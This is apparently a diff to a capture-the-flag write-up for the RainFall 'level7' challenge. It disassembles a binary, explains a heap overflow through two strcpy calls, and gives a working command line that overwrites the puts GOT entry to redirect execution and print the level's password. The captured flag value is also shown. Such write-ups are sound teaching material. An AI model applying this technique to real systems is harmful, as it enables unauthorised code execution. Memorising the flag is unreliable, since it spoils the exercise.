@@ -1,32 +1,101 @@
-The main begins with 4 mallocs:
-var_1ch = malloc(8);
-*var_1ch = 1;
-*(var_1ch + 4) = malloc(8);
-var_18ch = malloc(8);
-*var_18ch = 2;
-*(var_18ch + 4) = malloc(8);
+08048521 <main>:
+ 8048521:	55                   	push   ebp
+ 8048522:	89 e5                	mov    ebp,esp
+ 8048524:	83 e4 f0             	and    esp,0xfffffff0
+ 8048527:	83 ec 20             	sub    esp,0x20
+ 804852a:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
+ 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
+ 8048536:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
+ 804853a:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
+ 804853e:	c7 00 01 00 00 00    	mov    DWORD PTR [eax],0x1
+ 8048544:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
+ 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
+ 8048550:	89 c2                	mov    edx,eax
+ 8048552:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
+ 8048556:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
+ 8048559:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
+ 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
+ 8048565:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
+ 8048569:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
+ 804856d:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2
+ 8048573:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
+ 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
+ 804857f:	89 c2                	mov    edx,eax
+ 8048581:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
+ 8048585:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
+ 8048588:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 804858b:	83 c0 04             	add    eax,0x4
+ 804858e:	8b 00                	mov    eax,DWORD PTR [eax]
+ 8048590:	89 c2                	mov    edx,eax
+ 8048592:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
+ 8048596:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
+ 8048599:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 804859d:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
+ 80485a5:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 80485a8:	83 c0 08             	add    eax,0x8
+ 80485ab:	8b 00                	mov    eax,DWORD PTR [eax]
+ 80485ad:	89 c2                	mov    edx,eax
+ 80485af:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
+ 80485b3:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
+ 80485b6:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 80485ba:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
+ 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9
+ 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb
+ 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
+ 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44
+ 80485e3:	00 
+ 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960
+ 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
+ 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703
+ 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
+ 80485fc:	b8 00 00 00 00       	mov    eax,0x0
+ 8048601:	c9                   	leave  
+ 8048602:	c3                   	ret    
 
-Then it strcpy(*(var_1ch + 4), argv[1]);
-also it strcpy(*(var_18ch + 4), argv[2]);
+The main begins with 4 mallocs:
+
+	first_malloc = malloc(8);
+	first_malloc[0] = 1;
+	first_malloc[1] = malloc(8);
+
+	third_malloc = malloc(8);
+	third_malloc[0] = 2;
+	third_malloc[1] = malloc(8);
+
+	strcpy(first_malloc[1], argv[1]);
+	strcpy(third_malloc[1], argv[2]);
 
 Since the mallocs are contiguous (with padding to 16 bytes alignment), we can affect the second strcpy with the first one.
-*(var_18ch + 4) being dependent on argv[1], we can write our argv[2] anywhere.
+*(third_malloc + 4) being dependent on argv[1], we can write our argv[2] anywhere.
 
-At the end of the main we can see the pass is not printed, when it tries to puts a hardcoded address.
-0x080485c2      edx = 0x80486e9
-0x080485cc      dword [size] = edx                         ; const char *mode
-0x080485d0      dword [esp] = eax                          ; const char *filename
-0x080485d3      sym.imp.fopen ()                           ;[3] ; file*fopen(const char *filename, const char *mode)
-0x080485d8      dword [stream] = eax                       ; FILE *stream
-0x080485dc      dword [size] = 0x44                        ; 'D' ; [0x44:4]=-1 ; 68 ; int size
-0x080485e4      dword [esp] = obj.c                        ; [0x8049960:4]=0 ; char *s
-0x080485eb      sym.imp.fgets ()                           ;[4] ; char *fgets(char *s, int size, FILE *stream)
-0x080485f0      dword [esp] = 0x8048703                    ; [0x8048703:4]=0x7e7e ; const char *s
-0x080485f7      sym.imp.puts ()                            ;[5] ; int puts(const char *s)
+At the end of the main we can see the pass is not printed, it puts a hardcoded address.
+ 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9 ; "r"
+ 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb ; "/home/user/level8/.pass"
+ 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
+ 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44
+ 80485e3:	00 
+ 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960 ; "~~"
+ 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
+ 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703
+ 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
 
-The goal will be to redirect execution after the fgets, which writes the pass on obj.c, to sym.m which prints obj.c
+The goal will be to redirect execution after the fgets, which writes the pass on c, to m which prints c.
 
-We can overwrite the GOT entry of puts, redirecting to sym.m
+We can overwrite the GOT entry of puts, redirecting to m
 
-To access *(var_18ch + 4) we need to fill the 16 bytes of the var_1ch (8 bytes malloc'd + 8 bytes of padding to alignment) then fill the first four bytes of var_18ch then write our target address 0x08049928 (sym.puts GOT entry).
-On the second strcpy, we determine what will be the code executed when puts is called, here sym.m (0x080484f4)
+To access *(third_malloc + 4) we need to fill the 16 bytes of the first_malloc (8 bytes malloc'd + 8 bytes of padding to alignment) then fill the first four bytes of third_malloc then write our target address 0x08049928 (puts GOT entry).
+On the second strcpy, we determine what will be the code executed when puts is called, here m (0x080484f4)
+./level7 "`python -c 'import sys; sys.stdout.write("B" * 20)'``echo -ne '\x28\x99\x04\x08'`" "`echo -ne '\xf4\x84\x04\x08'`"
+
+level7@RainFall:~$ ./level7 "`python -c 'import sys; sys.stdout.write("B" * 20)'``echo -ne '\x28\x99\x04\x08'`" "`echo -ne '\xf4\x84\x04\x08'`"
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1701966818
+We've got our flag.
